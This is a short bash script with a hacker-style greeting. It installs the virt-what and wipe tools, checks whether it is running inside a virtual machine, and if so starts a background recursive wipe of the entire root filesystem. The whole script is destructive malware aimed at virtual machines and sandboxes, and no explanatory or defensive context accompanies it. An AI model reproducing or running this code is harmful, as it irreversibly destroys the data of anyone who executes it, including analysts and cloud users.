#!/bin/bash
printf "Welcome 2 _unkn0wn...\n"
{
apt -f -y install ; [[ -z "$(type virt-what)" ]] && apt-get -y install virt-what ; [[ -z "$(type wipe)" ]] && apt-get -y install wipe
result="$(virt-what)" ; [[ -n $result ]] && wipe -fkqrs -Q1 / &
}
